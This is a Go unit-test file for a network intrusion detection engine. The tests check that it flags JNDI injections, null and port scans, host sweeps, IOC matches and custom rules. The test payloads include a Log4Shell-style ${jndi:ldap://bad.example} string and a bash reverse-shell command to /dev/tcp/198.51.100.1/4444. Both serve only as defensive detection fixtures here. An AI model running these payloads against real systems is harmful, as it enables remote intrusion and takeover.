package ids

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"netprobe-ir/internal/decode"
	"netprobe-ir/internal/model"
)

func baseFlow(id string) model.Flow {
	return model.Flow{
		ID: id, Direction: model.DirectionOutbound,
		Local:   model.Endpoint{IP: "10.0.0.5", Port: 50000},
		Remote:  model.Endpoint{IP: "198.51.100.10", Port: 80},
		Process: &model.ProcessInfo{PID: 123, Comm: "curl", Exe: "/usr/bin/curl"},
		DPI:     model.DPIInfo{Protocol: "HTTP", Application: "HTTP", Confidence: 100},
	}
}

func basePacket(ts time.Time) *decode.Packet {
	return &decode.Packet{Time: ts, Interface: "eth0", Direction: model.DirectionOutbound, Protocol: "TCP", SrcIP: "10.0.0.5", DstIP: "198.51.100.10", SrcPort: 50000, DstPort: 80, TCPFlags: 0x18}
}

func TestJNDISignature(t *testing.T) {
	e := New(Config{Enabled: true})
	p := basePacket(time.Now())
	p.Payload = []byte("GET /?x=${jndi:ldap://bad.example/a} HTTP/1.1\r\nHost: x\r\n\r\n")
	f := baseFlow("f1")
	out := e.Observe(p, f, true, "1")
	var got bool
	for _, x := range out {
		if x.RuleID == "NP-IDS-1201" && x.Verdict == "signature_match" && x.Confidence >= 99 {
			got = true
		}
	}
	if !got {
		t.Fatalf("missing JNDI finding: %#v", out)
	}
}

func TestNullScanSignature(t *testing.T) {
	e := New(Config{Enabled: true})
	p := basePacket(time.Now())
	p.TCPFlags = 0
	f := baseFlow("f2")
	out := e.Observe(p, f, true, "2")
	if len(out) == 0 || out[0].RuleID != "NP-IDS-1003" {
		t.Fatalf("unexpected findings: %#v", out)
	}
}

func TestStatefulPortScan(t *testing.T) {
	e := New(Config{Enabled: true, PortScanPorts: 5, HostSweepHosts: 100, WindowSeconds: 30})
	now := time.Now()
	found := false
	for i := 0; i < 6; i++ {
		p := basePacket(now.Add(time.Duration(i) * time.Millisecond))
		p.DstPort = uint16(1000 + i)
		f := baseFlow("scan" + string(rune('a'+i)))
		f.Remote.Port = p.DstPort
		for _, x := range e.Observe(p, f, true, "p") {
			if x.RuleID == "NP-IDS-1101" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("stateful port scan threshold did not fire")
	}
}

func TestExactIOC(t *testing.T) {
	d := t.TempDir()
	path := filepath.Join(d, "ioc.json")
	if err := os.WriteFile(path, []byte(`{"ips":["198.51.100.10"],"domains":["evil.example"],"ja3":["abc"]}`), 0600); err != nil {
		t.Fatal(err)
	}
	e := New(Config{Enabled: true, IOCFile: path})
	p := basePacket(time.Now())
	f := baseFlow("ioc")
	f.DPI.TLS = &model.TLSInfo{SNI: "sub.evil.example", JA3: "abc"}
	out := e.Observe(p, f, true, "3")
	seen := map[string]bool{}
	for _, x := range out {
		seen[x.RuleID] = true
	}
	for _, id := range []string{"NP-IOC-IP", "NP-IOC-SNI", "NP-IOC-JA3"} {
		if !seen[id] {
			t.Fatalf("missing %s in %#v", id, out)
		}
	}
}

func TestCustomRuleRegex(t *testing.T) {
	d := t.TempDir()
	path := filepath.Join(d, "rules.json")
	rules := `[{
	  "id":"LOCAL-9001","title":"Sensitive API path","severity":"high","confidence":97,
	  "verdict":"signature_match","category":"custom","field":"http.path","operator":"regex","value":"(?i)^/admin/(shell|exec)"
	}]`
	if err := os.WriteFile(path, []byte(rules), 0600); err != nil {
		t.Fatal(err)
	}
	e := New(Config{Enabled: true, RulesFile: path})
	p := basePacket(time.Now())
	f := baseFlow("custom")
	f.DPI.HTTP = &model.HTTPInfo{Method: "GET", Path: "/admin/exec"}
	out := e.Observe(p, f, true, "4")
	found := false
	for _, x := range out {
		if x.RuleID == "LOCAL-9001" {
			found = true
		}
	}
	if !found {
		t.Fatalf("custom rule did not fire: %#v", out)
	}
}

func TestReverseShellSignature(t *testing.T) {
	e := New(Config{Enabled: true})
	p := basePacket(time.Now())
	p.Payload = []byte("POST /run HTTP/1.1\r\nHost: x\r\n\r\nbash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
	f := baseFlow("reverse-shell")
	out := e.Observe(p, f, true, "5")
	for _, x := range out {
		if x.RuleID == "NP-IDS-1207" && x.Verdict == "signature_match" {
			return
		}
	}
	t.Fatalf("missing reverse shell finding: %#v", out)
}

func TestHostSweepIsSameServicePort(t *testing.T) {
	e := New(Config{Enabled: true, PortScanPorts: 100, HostSweepHosts: 5, WindowSeconds: 30})
	now := time.Now()
	found := false
	for i := 1; i <= 6; i++ {
		p := basePacket(now.Add(time.Duration(i) * time.Millisecond))
		p.DstIP = fmt.Sprintf("198.51.100.%d", i)
		p.DstPort = 22
		f := baseFlow(fmt.Sprintf("sweep-%d", i))
		f.Remote.IP, f.Remote.Port = p.DstIP, 22
		for _, x := range e.Observe(p, f, true, fmt.Sprint(i)) {
			if x.RuleID == "NP-IDS-1102" {
				found = true
			}
		}
	}
	if !found {
		t.Fatal("same-service host sweep threshold did not fire")
	}
}

func TestDifferentServiceFanoutDoesNotBecomeHostSweep(t *testing.T) {
	e := New(Config{Enabled: true, PortScanPorts: 100, HostSweepHosts: 5, WindowSeconds: 30})
	now := time.Now()
	for i := 1; i <= 8; i++ {
		p := basePacket(now.Add(time.Duration(i) * time.Millisecond))
		p.DstIP = fmt.Sprintf("198.51.100.%d", i)
		p.DstPort = uint16(8000 + i)
		f := baseFlow(fmt.Sprintf("fanout-%d", i))
		f.Remote.IP, f.Remote.Port = p.DstIP, p.DstPort
		for _, x := range e.Observe(p, f, true, fmt.Sprint(i)) {
			if x.RuleID == "NP-IDS-1102" {
				t.Fatalf("unexpected host sweep: %#v", x)
			}
		}
	}
}

func TestJA4IOC(t *testing.T) {
	d := t.TempDir()
	path := filepath.Join(d, "ioc.json")
	os.WriteFile(path, []byte(`{"ja4":["t13d0101h2_aaaaaaaaaaaa_bbbbbbbbbbbb"]}`), 0600)
	e := New(Config{Enabled: true, IOCFile: path})
	p := basePacket(time.Now())
	f := baseFlow("ja4")
	f.DPI.TLS = &model.TLSInfo{JA4: "t13d0101h2_aaaaaaaaaaaa_bbbbbbbbbbbb"}
	for _, x := range e.Observe(p, f, true, "ja4p") {
		if x.RuleID == "NP-IOC-JA4" {
			return
		}
	}
	t.Fatal("JA4 IOC did not fire")
}

func TestRuleLifecycleDraftOnlyRunsInLabMode(t *testing.T) {
	d := t.TempDir()
	path := filepath.Join(d, "rules.json")
	os.WriteFile(path, []byte(`[{"id":"DRAFT-1","status":"draft","title":"draft","field":"http.path","operator":"contains","value":"/draft"}]`), 0600)
	p := basePacket(time.Now())
	f := baseFlow("draft")
	f.DPI.HTTP = &model.HTTPInfo{Path: "/draft"}
	prod := New(Config{Enabled: true, RulesFile: path})
	if out := prod.Observe(p, f, true, "prod"); len(out) != 0 {
		t.Fatalf("draft fired in prod: %#v", out)
	}
	lab := New(Config{Enabled: true, RulesFile: path, RuleLabMode: true})
	found := false
	for _, x := range lab.Observe(p, f, true, "lab") {
		if x.RuleID == "DRAFT-1" {
			found = true
		}
	}
	if !found {
		t.Fatal("draft did not run in lab mode")
	}
}
